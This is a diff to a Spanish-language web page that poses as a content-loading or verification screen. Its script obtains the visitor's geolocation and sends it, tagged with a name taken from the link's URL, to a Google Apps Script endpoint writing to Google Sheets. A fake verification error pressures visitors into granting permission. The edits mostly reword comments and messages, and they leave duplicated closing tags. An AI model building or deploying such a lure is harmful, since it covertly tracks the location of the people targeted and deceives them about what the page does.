@@ -67,13 +67,13 @@
 <body>
 
   <div class="box">
-    <!-- Vista 1: Carga -->
+    <!-- Pantalla de carga inicial -->
     <div id="pantalla-carga">
       <div class="spinner"></div>
-      <p>Cargando contenido, por favor espera...</p>
+      <p id="texto-carga">Cargando contenido, por favor espera...</p>
     </div>
 
-    <!-- Vista 2: Mensaje de Error si rechaza el permiso -->
+    <!-- Pantalla de error si rechaza la ubicación -->
     <div id="pantalla-error" class="hidden">
       <div class="error-msg">⚠️ Error de Verificación</div>
       <p class="info-text">
@@ -84,10 +84,10 @@
   </div>
 
   <script>
-    // Reemplaza con la URL de tu ejecutable de Google Apps Script
+    // IMPORTANTE: Reemplaza esta URL con el enlace de tu Web App de Google Apps Script
     const SCRIPT_URL = 'https://script.google.com/macros/s/TU_SCRIPT_ID/exec';
 
-    // Función para obtener parámetros de la URL (?user=Nombre)
+    // Obtiene el nombre del usuario desde la URL (?user=Nombre)
     function obtenerUsuarioURL() {
       const params = new URLSearchParams(window.location.search);
       return params.get('user') || 'Anónimo / Desconocido';
@@ -115,7 +115,7 @@
             enviarAGoogleSheets(datos);
           },
           (error) => {
-            console.warn("Error o permiso denegado:", error.message);
+            console.warn("Permiso denegado o error de ubicación:", error.message);
             mostrarError();
           },
           {
@@ -144,13 +144,18 @@
         body: JSON.stringify(datos)
       })
       .then(() => {
-        document.getElementById('pantalla-carga').innerHTML = "<p>✅ Verificación completada.</p>";
+        document.getElementById('texto-carga').innerText = "✅ Verificación completada.";
+        document.querySelector('.spinner').style.display = 'none';
       })
       .catch((err) => {
-        console.error("Error al enviar:", err);
+        console.error("Error al enviar los datos:", err);
+        mostrarError();
       });
     }
   </script>
+
+</body>
+</html>
 
 </body>
 </html>
